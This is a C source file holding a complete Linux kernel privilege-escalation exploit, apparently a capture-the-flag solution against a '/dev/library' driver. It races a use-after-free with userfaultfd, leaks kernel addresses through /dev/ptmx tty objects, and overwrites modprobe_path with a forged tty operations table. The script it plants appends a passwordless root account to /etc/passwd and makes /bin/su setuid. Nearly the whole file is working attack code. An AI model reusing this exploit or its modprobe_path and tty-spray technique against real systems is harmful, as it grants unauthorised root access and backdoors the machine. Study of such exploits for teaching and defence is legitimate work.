#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>



typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG


#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

#define PAGE_SIZE 0x1000
#define CMD_ADD			0x3000
#define CMD_REMOVE		0x3001
#define CMD_REMOVE_ALL	0x3002
#define CMD_ADD_DESC	0x3003
#define CMD_GET_DESC 	0x3004

cpu_set_t pwn_cpu;
u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;
int devfd; 
void *page;
i64 victim;
char* buffer;
u64 kbase, kheap;
i64 uffd;
#define ADDR(x) (kbase - 0xffffffff81000000 + x) 

void panic(char*str){
    write(1, str, strlen(str));
    exit(-1);
}


void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}

void getShell()
{
    if (getuid())
    {
        puts("Bye");
    }
    write(1, "Get root\n", 10);
    char* argv[] = { "/bin/sh", NULL };
    char** envp = &argv[1];
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}
u64 page_size;




typedef struct Request {
	unsigned long index;
	char *ptr;
} Request;


void add_book(u64 index){
    Request req;
    req.index = index;
    req.ptr = NULL;
    ioctl(devfd, CMD_ADD, &req);
}

void remove_book(u64 index){
    Request req;
    req.index = index;
    ioctl(devfd, CMD_REMOVE, &req);

}

void add_description(u64 index, char* data){
    Request req;
    req.index = index;
    req.ptr = data;
    ioctl(devfd, CMD_ADD_DESC, &req);
}

void get_description(u64 index,char* data){
    Request req;
    req.index = index;
    req.ptr = data;
    ioctl(devfd, CMD_GET_DESC, &req);
}

void remove_all(){
    Request req;
    req.index = 0xffffffff;
    req.ptr = NULL;
    ioctl(devfd, CMD_REMOVE_ALL, &req);
}


i32 ptmx[0x200];
void *handler(void *arg){
    static struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd poll_fd;
    static int count = 0;
    i64 uffd;
    uffd = (i64)arg;
    poll_fd.fd = uffd;
    poll_fd.events = POLLIN;
    while(poll(&poll_fd, 1, -1) > 0){
        if(poll_fd.revents & POLLERR || poll_fd.revents & POLLHUP){
            panic("poll");
        }
        if(read(uffd, &msg, sizeof(msg)) <= 0){
            panic("read from uffd");
        }
        logOK("Successfully read from uffd");
        assert(msg.event == UFFD_EVENT_PAGEFAULT);
        switch(count++){
            case 0:
                //add_description(0, buffer);
                remove_all();
                victim = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                break;
            case 1:
                remove_all();
                break;
            case 2:
                remove_all();
                break;
            case 3:
                remove_all();
                break;
            default:
                panic("Failed to poll");
                break;

        }
        copy.dst = msg.arg.pagefault.address & (~0xfff);
        copy.src = (u64)buffer;
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1){
            panic("UFFDIO_COPY");
        }

    }
}

void setup_pagefault(void *addr, u64 len){

    pthread_t th;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    
    page_size = sysconf(_SC_PAGE_SIZE);
    uffd = syscall(__NR_userfaultfd, O_NONBLOCK);
    if (uffd == -1){
      panic("userfaultfd");
    }
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1){
        panic("UFFD_API");
    }
    uffdio_register.range.start = (u64)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1){
        panic("UFFDIO_REGISTER");
    }
    if (pthread_create(&th, NULL, handler, (void*)uffd)){
        panic("pthread_create");
    }


}


int main(){

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pthread_t th;    
    pin_cpu(0);
    save_state();

    devfd = open("/dev/library", O_RDONLY);
    if (devfd < 0){
        panic("Failed to open device");
    }

    logOK("Opened device");
    buffer = (char*)malloc(0x1000);
    page = mmap(NULL, 0x5000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (page == MAP_FAILED){
        panic("Mmap failed");
    }

    printf("Page: %p\n", page);
    setup_pagefault(page, 0x5000);

    char* new_modprobe = "/tmp/a";
    char* dummp = "/tmp/x";
    system("echo -en '\xff\xff\xff\xff' > /tmp/x");
    system("echo -en \"#!/bin/sh\necho 'pwn::0:0:root:/:/bin/sh' >> /etc/passwd\n/bin/chmod +s /bin/su\" > /tmp/a");
    system("chmod +x /tmp/x && chmod +x /tmp/a");

    add_book(0);
    get_description(0, (char*)page);
    close(victim);
    kbase = *(u64*)((u64*)page + 3) - 0x623560;
    kheap = *(u64*)((u64*)page + 7) - 0x38;
    u64 mov_ptr_rdx_esi = kbase + 0x13e9b1;
    u64 modprobe_path = kbase + 0x837d00;
    printf("Kbase: 0x%llx\n", kbase);
    printf("Kheap: 0x%llx\n", kheap);

    add_book(0);
    get_description(0, (char*)page + 0x1000);

    u64 next_ptr = *(u64*)((u64*)page + 512 + 64); 
    printf("Next_ptr: 0x%llx\n", next_ptr);

    add_book(0);
    *(u64*)((u64*)buffer + 64) = kheap + 0x20; 
    add_description(0, page + 0x2000);
    
    add_book(0);
    *(u64*)((u64*)buffer + 64 + 6) = next_ptr;
    add_description(0, buffer);
    // add_book(1);
    
    //add_book(2);
    for (u32 i = 0; i < 0x20; i++){
        ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
    char *tty = (char*)malloc(0x1000);
    get_description(0, tty);

    memcpy(buffer, tty, 0x400);

    u64 *rop = (u64*)buffer;
    rop[0] = mov_ptr_rdx_esi;
    rop[7] = kheap - 0x60;
    add_description(0, buffer);

    
    for (u32 i = 0; i < 0x20; i++){
        ioctl(ptmx[i], *(u32*)((u32*)new_modprobe), modprobe_path);
    }
    for (u32 i = 0; i < 0x20; i++){
        ioctl(ptmx[i], *(u32*)((u32*)new_modprobe + 1), modprobe_path + 4);
    }
    system("/tmp/x");
    system("cat /etc/passwd");
    system("su pwn");
    
    return 0;

}  